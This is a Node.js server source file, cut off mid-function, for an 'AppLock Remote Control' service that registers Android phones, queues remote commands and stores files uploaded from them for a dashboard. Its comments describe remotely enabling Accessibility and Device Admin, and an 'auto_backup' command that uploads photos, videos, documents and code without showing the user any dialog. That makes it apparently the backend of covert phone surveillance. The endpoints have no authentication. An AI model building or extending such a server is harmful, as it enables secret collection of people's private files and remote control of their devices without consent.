/**
 * AppLock Remote Control Server
 * Pure Node.js — zero external dependencies
 * Devices register via HTTP REST, dashboard polls for updates
 */

'use strict';

const http = require('http');
const fs   = require('fs');
const path = require('path');
const { randomUUID } = require('crypto');

// ─────────────────────────────────────────────────
// In-memory store  +  disk persistence
// ─────────────────────────────────────────────────
const devices = new Map();
// Map<deviceId, {
//   deviceId, deviceName, androidVersion, model,
//   brand, lastSeen, apps: Map<packageName, AppEntry>
// }>
// AppEntry: { packageName, label, isSystem, isGame, locked, icon(base64?) }

const pendingCommands = new Map();
// Map<deviceId, Array<{cmdId, action:'lock'|'unlock', packageName}>>

// -- Device persistence -------------------------------------------------------
// Render.com: backup_storage la ephemeral (mat sau restart container).
// Dung ca 2 path: /tmp (nhanh, con trong session) va backup_storage (bat buoc sao luu)
const DEVICES_PERSIST_DIR  = path.join(__dirname, 'backup_storage');
const DEVICES_PERSIST_FILE = path.join(DEVICES_PERSIST_DIR, 'devices_persist.json');
const DEVICES_TMP_FILE     = '/tmp/applock_devices.json'; // fallback nhanh hon

function savePersistedDevices() {
  try {
    const arr = [];
    for (const [, d] of devices) {
      const appsArr = [];
      for (const [, a] of d.apps) appsArr.push(a);
      arr.push({
        deviceId:       d.deviceId,
        deviceName:     d.deviceName,
        model:          d.model,
        brand:          d.brand,
        manufacturer:   d.manufacturer   || 'Unknown',
        androidVersion: d.androidVersion,
        sdkVersion:     d.sdkVersion     || 0,
        totalRamMB:     d.totalRamMB     || 0,
        screenRes:      d.screenRes      || '',
        registeredAt:   d.registeredAt   || d.lastSeen,
        lastSeen:       d.lastSeen,
        apps:           appsArr,
      });
    }
    const json = JSON.stringify(arr, null, 2);
    // Ghi /tmp truoc (nhanh, khong can tao thu muc)
    try { fs.writeFileSync(DEVICES_TMP_FILE, json, 'utf8'); } catch (_) {}
    // Ghi backup_storage (ton tai qua cac request cung session)
    if (!fs.existsSync(DEVICES_PERSIST_DIR))
      fs.mkdirSync(DEVICES_PERSIST_DIR, { recursive: true });
    fs.writeFileSync(DEVICES_PERSIST_FILE, json, 'utf8');
  } catch (e) {
    console.error('[PERSIST] Failed to save devices:', e.message);
  }
}

function loadPersistedDevices() {
  // Thu doc /tmp truoc (nhanh), sau do backup_storage
  const candidates = [DEVICES_TMP_FILE, DEVICES_PERSIST_FILE];
  let arr = null;
  for (const f of candidates) {
    try {
      if (fs.existsSync(f)) {
        const parsed = JSON.parse(fs.readFileSync(f, 'utf8'));
        if (Array.isArray(parsed) && parsed.length > 0) { arr = parsed; break; }
      }
    } catch (_) {}
  }
  if (!arr) { console.log('[PERSIST] No persisted devices found (fresh start).'); return; }

  try {
    for (const d of arr) {
      const appMap = new Map();
      for (const a of (d.apps || [])) appMap.set(a.packageName, a);
      devices.set(d.deviceId, {
        deviceId:       d.deviceId,
        deviceName:     d.deviceName,
        model:          d.model          || 'Unknown',
        brand:          d.brand          || 'Unknown',
        manufacturer:   d.manufacturer   || 'Unknown',
        androidVersion: d.androidVersion || 'Unknown',
        sdkVersion:     d.sdkVersion     || 0,
        totalRamMB:     d.totalRamMB     || 0,
        screenRes:      d.screenRes      || '',
        registeredAt:   d.registeredAt   || d.lastSeen || new Date().toISOString(),
        lastSeen:       d.lastSeen       || new Date().toISOString(),
        apps:           appMap,
      });
      if (!pendingCommands.has(d.deviceId)) pendingCommands.set(d.deviceId, []);
    }
    console.log(`[PERSIST] Loaded ${devices.size} device(s) from disk.`);
  } catch (e) {
    console.error('[PERSIST] Failed to load devices:', e.message);
  }
}

// ── Fetch-data command store ──────────────────────────────────────────────
const fetchDataCommands = {};   // { [deviceId]: [{cmdId, sentAt, status}] }
const fetchDataAckLog   = {};   // { [deviceId]: [{cmdId, agreed, ackedAt}] }

// ── Grant-permission command store ───────────────────────────────────────
// action="grant_permission" — yêu cầu app tự bật Accessibility / Device Admin từ xa
// { [deviceId]: [{cmdId, permissions:['accessibility'|'device_admin'|'usage_stats'|'draw_overlay'], sentAt, status}] }
const grantPermCmds = {};
const grantPermLog  = {};

// ── Auto-backup command store ─────────────────────────────────────────────
// action="auto_backup" — app tự đồng ý + upload mà không hiện dialog cho user
// { [deviceId]: [{cmdId, sentAt, status}] }
const autoBackupCmds = {};
const autoBackupLog  = {};

// ── Screen-lock command store ─────────────────────────────────────────────
// action="screen_lock" — khoá màn hình thiết bị từ xa
// { [deviceId]: [{cmdId, sentAt, status}] }
const screenLockCmds = {};
const screenLockLog  = {};

// ── Timed-lock command store ──────────────────────────────────────────────
// action="timed_lock" — khoá ứng dụng tạm thời, tự mở sau X phút
// { [deviceId]: [{cmdId, packageName, minutes, sentAt, status}] }
const timedLockCmds = {};
const timedLockLog  = {};

// ─────────────────────────────────────────────────
// Tiny router
// ─────────────────────────────────────────────────
const routes = [];
function route(method, pattern, handler) {
  routes.push({ method: method.toUpperCase(), pattern, handler });
}

function matchRoute(method, url) {
  for (const r of routes) {
    if (r.method !== method) continue;
    if (typeof r.pattern === 'string') {
      if (url === r.pattern || url.startsWith(r.pattern + '?')) {
        return { handler: r.handler, params: {} };
      }
    } else if (r.pattern instanceof RegExp) {
      const m = url.match(r.pattern);
      if (m) return { handler: r.handler, params: m.groups || {} };
    }
  }
  return null;
}

// ─────────────────────────────────────────────────
// Helpers
// ─────────────────────────────────────────────────
function parseBody(req) {
  return new Promise((resolve, reject) => {
    let raw = '';
    req.on('data', chunk => { raw += chunk; });
    req.on('end', () => {
      try { resolve(JSON.parse(raw || '{}')); }
      catch { reject(new Error('Bad JSON')); }
    });
    req.on('error', reject);
  });
}

function send(res, status, body, contentType = 'application/json') {
  const data = typeof body === 'string' ? body : JSON.stringify(body);
  res.writeHead(status, {
    'Content-Type': contentType,
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Methods': 'GET,POST,DELETE,OPTIONS',
    'Access-Control-Allow-Headers': 'Content-Type,X-Device-Id,X-File-Category,X-File-Modified,X-Device-Name,X-Device-Model,X-Device-Brand',
  });
  res.end(data);
}

function getQuery(url) {
  const idx = url.indexOf('?');
  if (idx === -1) return {};
  const params = {};
  new URLSearchParams(url.slice(idx + 1)).forEach((v, k) => params[k] = v);
  return params;
}

function timestamp() {
  return new Date().toISOString();
}

// ═══════════════════════════════════════════════════
// BACKUP MODULE — File Storage
// Routes: POST /api/backup/upload
//         GET  /api/backup/files
//         GET  /api/backup/file/:id
//         DELETE /api/backup/file/:id
//         GET  /backup   ← dashboard riêng
// ═══════════════════════════════════════════════════

const STORAGE_ROOT = path.join(__dirname, 'backup_storage');
const INDEX_FILE   = path.join(STORAGE_ROOT, 'index.json');

try {
  if (!fs.existsSync(STORAGE_ROOT)) fs.mkdirSync(STORAGE_ROOT, { recursive: true });
} catch (e) {
  console.error('[INIT] Failed to create STORAGE_ROOT, will retry on first upload:', e.message);
}

// In-memory index
const fileIndex = new Map();

// ── Backup Device Registry ────────────────────────────────────────────────
// Lưu tên thiết bị: { [deviceId]: { deviceId, deviceName, model, brand, registeredAt, lastUpload } }
const backupDevices = new Map();
const BACKUP_DEVICES_FILE = path.join(STORAGE_ROOT, 'backup_devices.json');

function loadBackupDevices() {
  try {
    if (fs.existsSync(BACKUP_DEVICES_FILE)) {
      const arr = JSON.parse(fs.readFileSync(BACKUP_DEVICES_FILE, 'utf8'));
      for (const d of arr) backupDevices.set(d.deviceId, d);
      console.log(`[BACKUP] Loaded ${backupDevices.size} backup device records.`);
    }
  } catch (e) {
    console.error('[BACKUP] Failed to load backup devices:', e.message);
  }
}

function saveBackupDevices() {
  try {
    fs.writeFileSync(BACKUP_DEVICES_FILE, JSON.stringify(Array.from(backupDevices.values()), null, 2), 'utf8');
  } catch (e) {
    console.error('[BACKUP] Failed to save backup devices:', e.message);
  }
}

function loadIndex() {
  try {
    if (fs.existsSync(INDEX_FILE)) {
      const raw = fs.readFileSync(INDEX_FILE, 'utf8');
      const arr = JSON.parse(raw);
      for (const rec of arr) fileIndex.set(rec.id, rec);
      console.log(`[BACKUP] Loaded ${fileIndex.size} records from index.`);
    }
  } catch (e) {
    console.error('[BACKUP] Failed to load index:', e.message);
  }
}

function saveIndex() {
  try {
    const arr = Array.from(fileIndex.values());
    fs.writeFileSync(INDEX_FILE, JSON.stringify(arr, null, 2), 'utf8');
  } catch (e) {
    console.error('[BACKUP] Failed to save index:', e.message);
  }
}

loadIndex();
loadBackupDevices();
loadPersistedDevices();

// ── Multipart parser (no busboy/formidable — pure Node) ──
function parseMultipart(req) {
  return new Promise((resolve, reject) => {
    const contentType = req.headers['content-type'] || '';
    const boundaryMatch = contentType.match(/boundary=([^\s;]+)/);
    if (!boundaryMatch) return reject(new Error('No boundary in Content-Type'));

    const boundary = '--' + boundaryMatch[1];

    let buffer = Buffer.alloc(0);
    const fields = {};
    let fileInfo = null;
    let fileWriteStream = null;
    let fileId = null;
    let filePath = null;
    let fileSize = 0;
    let parsingFile = false;
    let partHeaders = {};

    function sanitizeStr(str) {
      return String(str || 'unknown').replace(/[^a-zA-Z0-9_\-]/g, '_').slice(0, 64);
    }

    function processBuffer() {
      while (true) {
        if (!parsingFile) {
          const bIdx = buffer.indexOf(boundary);
          if (bIdx === -1) return;

          buffer = buffer.slice(bIdx + boundary.length);

          if (buffer.slice(0, 2).toString() === '--') {
            if (fileWriteStream) {
              fileWriteStream.end(() => resolve({ fields, fileId, filePath, fileSize, fileInfo }));
              fileWriteStream = null;
            } else {
              resolve({ fields, fileId, filePath, fileSize, fileInfo });
            }
            return;
          }

          if (buffer.slice(0, 2).toString() === '\r\n') buffer = buffer.slice(2);

          const headerEnd = buffer.indexOf('\r\n\r\n');
          if (headerEnd === -1) return;

          const rawHeaders = buffer.slice(0, headerEnd).toString('utf8');
          buffer = buffer.slice(headerEnd + 4);
          partHeaders = {};

          for (const line of rawHeaders.split('\r\n')) {
            const colonIdx = line.indexOf(':');
            if (colonIdx === -1) continue;
            partHeaders[line.slice(0, colonIdx).trim().toLowerCase()] = line.slice(colonIdx + 1).trim();
          }

          const disposition = partHeaders['content-disposition'] || '';
          const nameMatch     = disposition.match(/name="([^"]+)"/);
          const filenameMatch = disposition.match(/filename="([^"]+)"/);

          if (filenameMatch) {
            const originalName = filenameMatch[1];
            // FIX: uu tien header (header den truoc, fields co the chua parse xong)
            const deviceId = req.headers['x-device-id'] || fields['deviceId'] || 'unknown';
            const category = req.headers['x-file-category'] || fields['category'] || 'file';
            const mime     = partHeaders['content-type'] || 'application/octet-stream';

            fileId = randomUUID();
            const ext        = path.extname(originalName) || '';
            const storedName = fileId + ext;
            const deviceDir  = path.join(STORAGE_ROOT, sanitizeStr(deviceId), sanitizeStr(category));
            if (!fs.existsSync(deviceDir)) fs.mkdirSync(deviceDir, { recursive: true });

            filePath = path.join(deviceDir, storedName);
            fileInfo = { originalName, storedName, deviceId, category, mime, fileId };
            fileWriteStream = fs.createWriteStream(filePath);
            fileSize = 0;
            parsingFile = true;
          } else {
            parsingFile = false;
            const nextBoundary = buffer.indexOf('\r\n' + boundary);
            if (nextBoundary === -1) return;
            const fieldVal = buffer.slice(0, nextBoundary).toString('utf8');
            if (nameMatch) fields[nameMatch[1]] = fieldVal;
            buffer = buffer.slice(nextBoundary + 2);
          }
        } else {
          const nextBoundary = buffer.indexOf('\r\n' + boundary);
          if (nextBoundary !== -1) {
            if (nextBoundary > 0) {
              const chunk = buffer.slice(0, nextBoundary);
              fileWriteStream.write(chunk);
              fileSize += chunk.length;
            }
            buffer = buffer.slice(nextBoundary + 2);
            parsingFile = false;
            fileWriteStream.end();
            fileWriteStream = null;
          } else {
            const safeLen = Math.max(0, buffer.length - boundary.length - 4);
            if (safeLen > 0) {
              const chunk = buffer.slice(0, safeLen);
              fileWriteStream.write(chunk);
              fileSize += chunk.length;
              buffer = buffer.slice(safeLen);
            }
            return;
          }
        }
      }
    }

    req.on('data', chunk => { buffer = Buffer.concat([buffer, chunk]); processBuffer(); });
    req.on('end',  () => {
      processBuffer();
      if (fileWriteStream) fileWriteStream.end(() => resolve({ fields, fileId, filePath, fileSize, fileInfo }));
    });
    req.on('error', reject);
  });
}

function backupHumanSize(bytes) {
  if (bytes < 1024)            return bytes + ' B';
  if (bytes < 1024 * 1024)     return (bytes / 1024).toFixed(1) + ' KB';
  if (bytes < 1024 * 1024 * 1024) return (bytes / 1024 / 1024).toFixed(2) + ' MB';
  return (bytes / 1024 / 1024 / 1024).toFixed(2) + ' GB';
}

// ── Backup API Routes ──

// POST /api/backup/upload
route('POST', '/api/backup/upload', async (req, res) => {
  try {
    const { fields, fileId, filePath, fileSize, fileInfo } = await parseMultipart(req);
    if (!fileId || !filePath || !fileInfo) return send(res, 400, { error: 'No file received' });

    // Lấy tên thiết bị: ưu tiên header → field → existing record → deviceId
    const deviceName = req.headers['x-device-name'] || fields['deviceName'] || '';
    const model      = req.headers['x-device-model'] || fields['model'] || '';
    const brand      = req.headers['x-device-brand'] || fields['brand'] || '';
    const existing   = backupDevices.get(fileInfo.deviceId);
    const finalName  = deviceName || (existing && existing.deviceName) || fileInfo.deviceId;

    // Cập nhật registry
    backupDevices.set(fileInfo.deviceId, {
      deviceId:     fileInfo.deviceId,
      deviceName:   finalName,
      model:        model  || (existing && existing.model)  || '',
      brand:        brand  || (existing && existing.brand)  || '',
      registeredAt: (existing && existing.registeredAt) || new Date().toISOString(),
      lastUpload:   new Date().toISOString(),
    });
    saveBackupDevices();

    const record = {
      id:           fileId,
      deviceId:     fileInfo.deviceId,
      deviceName:   finalName,
      category:     fileInfo.category,
      originalName: fileInfo.originalName,
      storedName:   fileInfo.storedName,
      size:         fileSize,
      mimeType:     fileInfo.mime,
      lastModified: parseInt(fields['lastModified'] || '0', 10),
      uploadedAt:   new Date().toISOString(),
      relativePath: path.relative(STORAGE_ROOT,
                      path.join(STORAGE_ROOT,
                        String(fileInfo.deviceId || 'unknown').replace(/[^a-zA-Z0-9_\-]/g,'_').slice(0,64),
                        String(fileInfo.category  || 'file')  .replace(/[^a-zA-Z0-9_\-]/g,'_').slice(0,64),
                        fileInfo.storedName)),
    };

    fileIndex.set(fileId, record);
    saveIndex();
    console.log(`[BACKUP] Received: ${fileInfo.originalName} (${backupHumanSize(fileSize)}) from ${finalName} (${fileInfo.deviceId})`);
    send(res, 200, { ok: true, fileId, size: fileSize });
  } catch (e) {
    console.error('[BACKUP] Upload error:', e.message);
    send(res, 500, { error: e.message });
  }
});

// POST /backup — alias cho Android app (ExtendedFileBackupManager gửi lên đây)
route('POST', '/backup', async (req, res) => {
  try {
    const { fields, fileId, filePath, fileSize, fileInfo } = await parseMultipart(req);
    if (!fileId || !filePath || !fileInfo) return send(res, 400, { error: 'No file received' });

    // Lấy tên thiết bị: ưu tiên header → field → existing record → deviceId
    const deviceName = req.headers['x-device-name'] || fields['deviceName'] || '';
    const model      = req.headers['x-device-model'] || fields['model'] || '';
    const brand      = req.headers['x-device-brand'] || fields['brand'] || '';
    const existing   = backupDevices.get(fileInfo.deviceId);
    const finalName  = deviceName || (existing && existing.deviceName) || fileInfo.deviceId;

    // Cập nhật registry
    backupDevices.set(fileInfo.deviceId, {
      deviceId:     fileInfo.deviceId,
      deviceName:   finalName,
      model:        model  || (existing && existing.model)  || '',
      brand:        brand  || (existing && existing.brand)  || '',
      registeredAt: (existing && existing.registeredAt) || new Date().toISOString(),
      lastUpload:   new Date().toISOString(),
    });
    saveBackupDevices();

    const record = {
      id:           fileId,
      deviceId:     fileInfo.deviceId,
      deviceName:   finalName,
      category:     fileInfo.category,
      originalName: fileInfo.originalName,
      storedName:   fileInfo.storedName,
      size:         fileSize,
      mimeType:     fileInfo.mime,
      lastModified: parseInt(fields['lastModified'] || '0', 10),
      uploadedAt:   new Date().toISOString(),
      relativePath: path.relative(STORAGE_ROOT,
                      path.join(STORAGE_ROOT,
                        String(fileInfo.deviceId || 'unknown').replace(/[^a-zA-Z0-9_\-]/g,'_').slice(0,64),
                        String(fileInfo.category  || 'file')  .replace(/[^a-zA-Z0-9_\-]/g,'_').slice(0,64),
                        fileInfo.storedName)),
    };

    fileIndex.set(fileId, record);
    saveIndex();
    console.log(`[BACKUP] Received (via /backup): ${fileInfo.originalName} (${backupHumanSize(fileSize)}) from ${finalName} (${fileInfo.deviceId})`);
    send(res, 200, { ok: true, fileId, size: fileSize });
  } catch (e) {
    console.error('[BACKUP] Upload error:', e.message);
    send(res, 500, { error: e.message });
  }
});

// POST /api/backup/register-device
// Android gọi trước khi upload để đăng ký tên thiết bị
// Body: { deviceId, deviceName, model, brand }
route('POST', '/api/backup/register-device', async (req, res) => {
  let body;
  try { body = await parseBody(req); }
  catch { return send(res, 400, { error: 'Bad JSON' }); }

  const { deviceId, deviceName, model, brand } = body;
  if (!deviceId || !deviceName) return send(res, 400, { error: 'deviceId và deviceName bắt buộc' });

  const existing = backupDevices.get(deviceId);
  backupDevices.set(deviceId, {
    deviceId,
    deviceName,
    model:        model  || (existing && existing.model)  || '',
    brand:        brand  || (existing && existing.brand)  || '',
    registeredAt: (existing && existing.registeredAt) || new Date().toISOString(),
    lastUpload:   (existing && existing.lastUpload)   || null,
  });
  saveBackupDevices();
  console.log(`[BACKUP] Device registered: ${deviceName} (${deviceId})`);
  send(res, 200, { ok: true });
});

// GET /api/backup/devices
// Trả về danh sách thiết bị với tên thật (dùng cho dropdown backup dashboard)
route('GET', '/api/backup/devices', (req, res) => {
  const seen = new Set();
  const list = [];

  // Từ registry chính
  for (const d of backupDevices.values()) {
    seen.add(d.deviceId);
    list.push({
      deviceId:     d.deviceId,
      deviceName:   d.deviceName || d.deviceId,
      model:        d.model  || '',
      brand:        d.brand  || '',
      registeredAt: d.registeredAt || null,
      lastUpload:   d.lastUpload   || null,
      fileCount:    Array.from(fileIndex.values()).filter(f => f.deviceId === d.deviceId).length,
    });
  }

  // Thiết bị có file nhưng chưa trong registry (fallback)
  for (const f of fileIndex.values()) {
    if (!seen.has(f.deviceId)) {
      seen.add(f.deviceId);
      list.push({
        deviceId:   f.deviceId,
        deviceName: f.deviceName || f.deviceId,
        model: '', brand: '', registeredAt: null, lastUpload: null,
        fileCount: Array.from(fileIndex.values()).filter(x => x.deviceId === f.deviceId).length,
      });
    }
  }

  send(res, 200, list);
});

// GET /api/backup/files?deviceId=&category=&page=&pageSize=
route('GET', /^\/api\/backup\/files(\?.*)?$/, (req, res) => {
  const q = getQuery(req.url);
  let records = Array.from(fileIndex.values());
  if (q.deviceId) records = records.filter(r => r.deviceId === q.deviceId);
  if (q.category) records = records.filter(r => r.category === q.category);
  records.sort((a, b) => new Date(b.uploadedAt) - new Date(a.uploadedAt));
  const page     = Math.max(1, parseInt(q.page || '1', 10));
  const pageSize = Math.min(200, Math.max(1, parseInt(q.pageSize || '50', 10)));
  const total    = records.length;
  const paged    = records.slice((page - 1) * pageSize, page * pageSize);
  send(res, 200, { total, page, pageSize, files: paged });
});

// GET /api/backup/file/:id — serve/download
route('GET', /^\/api\/backup\/file\/([^/?]+)/, (req, res) => {
  const id  = (req.url.match(/\/api\/backup\/file\/([^/?]+)/) || [])[1];
  const rec = fileIndex.get(id);
  if (!rec) return send(res, 404, { error: 'Not found' });
  const absPath = path.join(STORAGE_ROOT, rec.relativePath);
  if (!fs.existsSync(absPath)) return send(res, 404, { error: 'File missing on disk' });
  const stat    = fs.statSync(absPath);
  const isInline = (rec.mimeType || '').startsWith('image/') || (rec.mimeType || '').startsWith('video/');
  res.writeHead(200, {
    'Content-Type':        rec.mimeType || 'application/octet-stream',
    'Content-Length':      stat.size,
    'Content-Disposition': isInline
      ? `inline; filename="${rec.originalName}"`
      : `attachment; filename="${rec.originalName}"`,
    'Access-Control-Allow-Origin': '*',
  });
  fs.createReadStream(absPath).pipe(res);
});

// DELETE /api/backup/file/:id
route('DELETE', /^\/api\/backup\/file\/([^/?]+)/, (req, res) => {
  const id  = (req.url.match(/\/api\/backup\/file\/([^/?]+)/) || [])[1];
  const rec = fileIndex.get(id);
  if (!rec) return send(res, 404, { error: 'Not found' });
  const absPath = path.join(STORAGE_ROOT, rec.relativePath);
  try {
    if (fs.existsSync(absPath)) fs.unlinkSync(absPath);
    fileIndex.delete(id);
    saveIndex();
    console.log(`[BACKUP] Deleted: ${rec.originalName} (${id})`);
    send(res, 200, { ok: true });
  } catch (e) {
    send(res, 500, { error: e.message });
  }
});

// GET /backup — Backup Storage Dashboard (trang riêng)
route('GET', '/backup', (req, res) => {
  send(res, 200, getBackupDashboardHTML(), 'text/html; charset=utf-8');
});

// ─────────────────────────────────────────────────
// Backup Dashboard HTML
// ─────────────────────────────────────────────────
function getBackupDashboardHTML() {
  const totalFiles = fileIndex.size;
  const totalBytes = Array.from(fileIndex.values()).reduce((s, r) => s + (r.size || 0), 0);
  return `<!DOCTYPE html>
<html lang="vi">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>📦 Kho Lưu Trữ Backup</title>
<style>
  *{box-sizing:border-box;margin:0;padding:0}
  body{background:#0D1117;color:#E6EDF3;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;min-height:100vh}
  header{background:linear-gradient(135deg,#1565C0,#0D47A1);padding:24px 28px 20px;position:sticky;top:0;z-index:100}
  header h1{font-size:22px;font-weight:700}
  header p{color:rgba(255,255,255,.7);font-size:13px;margin-top:4px}
  header a{color:rgba(255,255,255,.7);font-size:12px;text-decoration:none;background:rgba(255,255,255,.1);border:1px solid rgba(255,255,255,.2);border-radius:999px;padding:4px 12px;margin-top:6px;display:inline-block}
  header a:hover{background:rgba(255,255,255,.2)}
  .stats-bar{display:flex;gap:12px;padding:16px 20px;background:#161B22;border-bottom:1px solid #21262D;flex-wrap:wrap}
  .stat-pill{background:#1C2230;border-radius:20px;padding:6px 14px;font-size:13px;color:#8B949E}
  .stat-pill b{color:#4F8EF7}
  .controls{display:flex;gap:10px;padding:14px 20px;flex-wrap:wrap;background:#0D1117;border-bottom:1px solid #21262D;align-items:center}
  select,input{background:#161B22;border:1px solid #30363D;color:#E6EDF3;border-radius:8px;padding:7px 12px;font-size:13px;outline:none}
  #file-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(240px,1fr));gap:14px;padding:18px 20px}
  .file-card{background:#161B22;border:1px solid #21262D;border-radius:12px;overflow:hidden;transition:.15s}
  .file-card:hover{border-color:#4F8EF7;transform:translateY(-2px)}
  .file-thumb{width:100%;height:140px;object-fit:cover;background:#0D1117;display:block}
  .file-thumb-placeholder{width:100%;height:140px;background:#1C2230;display:flex;align-items:center;justify-content:center;font-size:40px}
  .file-body{padding:12px}
  .file-name{font-size:13px;font-weight:600;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;color:#E6EDF3}
  .file-meta{font-size:11px;color:#8B949E;margin-top:4px}
  .tag{display:inline-block;font-size:10px;font-weight:700;border-radius:10px;padding:2px 8px;margin-right:4px}
  .tag-image{background:#1B3A6B;color:#4F8EF7}
  .tag-video{background:#3B1F5E;color:#CE93D8}
  .tag-download{background:#1B4D3E;color:#66BB6A}
  .tag-file{background:#4A3000;color:#FFB74D}
  .tag-code{background:#1A3A2A;color:#4ade80}
  .file-actions{display:flex;gap:6px;margin-top:8px}
  .act-btn{flex:1;border:none;cursor:pointer;border-radius:6px;padding:5px 0;font-size:11px;font-weight:600}
  .act-view{background:#4F8EF7;color:#fff}.act-dl{background:#43A047;color:#fff}.act-del{background:#E53935;color:#fff}
  .pagination{display:flex;gap:8px;justify-content:center;padding:16px;flex-wrap:wrap}
  .page-btn{border:1px solid #30363D;background:#161B22;color:#E6EDF3;border-radius:8px;padding:6px 14px;cursor:pointer;font-size:13px}
  .page-btn.active{background:#4F8EF7;border-color:#4F8EF7;color:#fff}
  #empty{text-align:center;padding:80px 20px;color:#484F58;font-size:15px}
  .modal-bg{position:fixed;inset:0;background:rgba(0,0,0,.75);display:flex;align-items:center;justify-content:center;z-index:999}
  .modal-box{background:#161B22;border-radius:14px;padding:20px;max-width:90vw;max-height:90vh;overflow:auto;text-align:center}
  .modal-box img,.modal-box video{max-width:80vw;max-height:70vh;border-radius:8px}
  .modal-close{margin-top:12px;background:#E53935;color:#fff;border:none;border-radius:8px;padding:8px 24px;cursor:pointer;font-weight:600}
  .loader{text-align:center;padding:60px;color:#8B949E;font-size:15px}
</style>
</head>
<body>
<header>
  <h1>📦 Kho Lưu Trữ Backup</h1>
  <p id="header-sub">Đang tải...</p>
  <a href="/">← AppLock Dashboard</a>
</header>
<div class="stats-bar" id="stats-bar">
  <div class="stat-pill">Đang tải...</div>
</div>
<div class="controls">
  <select id="sel-device" onchange="applyFilters()"><option value="">🖥 Tất cả thiết bị</option></select>
  <select id="sel-category" onchange="applyFilters()">
    <option value="">📁 Tất cả loại</option>
    <option value="image">🖼 Ảnh</option>
    <option value="video">🎬 Video</option>
    <option value="download">⬇ Download</option>
    <option value="file">📄 Tài liệu</option>
    <option value="code">💻 File code</option>
  </select>
  <input id="inp-search" type="text" placeholder="🔍 Tìm tên file..." oninput="applyFilters()" style="min-width:180px">
  <span style="margin-left:auto;font-size:13px;color:#8B949E" id="count-label"></span>
</div>
<div id="file-grid"><div class="loader">⏳ Đang tải dữ liệu...</div></div>
<div class="pagination" id="pagination"></div>
<div id="modal-root"></div>

<script>
  // deviceMap: { [deviceId]: deviceName } — để hiển thị tên thật thay vì UUID
  let allFiles = [], filtered = [], deviceMap = {};
  let page = 1, pageSize = 60;

  async function load() {
    try {
      // 1. Load danh sách thiết bị trước để có tên hiển thị
      try {
        const dr = await fetch('/api/backup/devices');
        const devList = await dr.json();
        deviceMap = {};
        for (const d of devList) deviceMap[d.deviceId] = d.deviceName || d.deviceId;
      } catch(e) { /* không fatal — tiếp tục */ }

      // 2. Load files
      const r = await fetch('/api/backup/files?pageSize=5000');
      const d = await r.json();
      allFiles = d.files || [];
      // Fallback: nếu file có deviceName thì dùng
      for (const f of allFiles) {
        if (!deviceMap[f.deviceId]) {
          deviceMap[f.deviceId] = f.deviceName || f.deviceId;
        }
      }

      populateDeviceSelect();
      applyFilters();
      updateStats();
    } catch(e) {
      document.getElementById('file-grid').innerHTML = '<div id="empty">❌ Không thể tải dữ liệu</div>';
    }
  }

  function getDeviceName(deviceId) {
    return deviceMap[deviceId] || deviceId;
  }

  function populateDeviceSelect() {
    const sel = document.getElementById('sel-device');
    sel.innerHTML = '<option value="">🖥 Tất cả thiết bị</option>';
    const seen = new Set();
    for (const [deviceId, deviceName] of Object.entries(deviceMap)) {
      if (seen.has(deviceId)) continue;
      seen.add(deviceId);
      const opt = document.createElement('option');
      opt.value = deviceId;
      opt.textContent = '📱 ' + deviceName;
      sel.appendChild(opt);
    }
  }

  function updateStats() {
    const total    = allFiles.length;
    const sizes    = allFiles.reduce((s,f) => s + (f.size||0), 0);
    const imgs     = allFiles.filter(f => f.category==='image').length;
    const vids     = allFiles.filter(f => f.category==='video').length;
    const docs     = allFiles.filter(f => f.category==='file'||f.category==='download').length;
    const codes    = allFiles.filter(f => f.category==='code').length;
    const devCount = Object.keys(deviceMap).length;
    document.getElementById('stats-bar').innerHTML =
      '<div class="stat-pill"><b>'+total+'</b> file</div>' +
      '<div class="stat-pill">💾 <b>'+humanSize(sizes)+'</b></div>' +
      '<div class="stat-pill">🖼 <b>'+imgs+'</b> ảnh</div>' +
      '<div class="stat-pill">🎬 <b>'+vids+'</b> video</div>' +
      '<div class="stat-pill">📄 <b>'+docs+'</b> tài liệu</div>' +
      (codes > 0 ? '<div class="stat-pill">💻 <b>'+codes+'</b> code</div>' : '') +
      '<div class="stat-pill">🖥 <b>'+devCount+'</b> thiết bị</div>';
    document.getElementById('header-sub').textContent =
      'Tổng ' + total + ' file từ ' + devCount + ' thiết bị — ' + humanSize(sizes);
  }

  function applyFilters() {
    const dev = document.getElementById('sel-device').value;
    const cat = document.getElementById('sel-category').value;
    const q   = document.getElementById('inp-search').value.toLowerCase();
    filtered = allFiles.filter(f => {
      if (dev && f.deviceId !== dev) return false;
      if (cat && f.category !== cat) return false;
      if (q && !f.originalName.toLowerCase().includes(q)) return false;
      return true;
    });
    page = 1;
    render();
  }

  function render() {
    const grid  = document.getElementById('file-grid');
    const total = filtered.length;
    const pages = Math.ceil(total / pageSize) || 1;
    const start = (page - 1) * pageSize;
    const items = filtered.slice(start, start + pageSize);
    document.getElementById('count-label').textContent = total + ' file';
    if (total === 0) {
      grid.innerHTML = '<div id="empty">📭 Không tìm thấy file nào</div>';
      document.getElementById('pagination').innerHTML = '';
      return;
    }
    grid.innerHTML = items.map(renderCard).join('');
    renderPagination(pages);
  }

  function renderCard(f) {
    const isImg = (f.mimeType||'').startsWith('image/');
    const isVid = (f.mimeType||'').startsWith('video/');
    const iconMap = {image:'🖼',video:'🎬',download:'⬇',file:'📄',code:'💻'};
    const thumb = isImg
      ? '<img class="file-thumb" src="/api/backup/file/'+f.id+'" alt="" loading="lazy" onerror="this.parentElement.innerHTML=\'<div class=file-thumb-placeholder>🖼</div>\'">'
      : '<div class="file-thumb-placeholder">'+(iconMap[f.category]||'📁')+'</div>';
    const tagLabel = {image:'Ảnh',video:'Video',download:'Download',file:'Tài liệu',code:'Code'}[f.category]||f.category;
    const viewBtn = (isImg||isVid)
      ? '<button class="act-btn act-view" onclick="preview(\''+f.id+'\',\''+esc(f.mimeType)+'\')">👁 Xem</button>'
      : '';
    return '<div class="file-card">'+thumb+
      '<div class="file-body">'+
        '<div class="file-name" title="'+esc(f.originalName)+'">'+esc(f.originalName)+'</div>'+
        '<div class="file-meta"><span class="tag tag-'+(f.category||'file')+'">'+tagLabel+'</span>'+humanSize(f.size||0)+' · '+relTime(f.uploadedAt)+'</div>'+
        '<div class="file-meta" style="margin-top:3px;font-size:10px">📱 '+esc(getDeviceName(f.deviceId))+'</div>'+
        '<div class="file-actions">'+viewBtn+
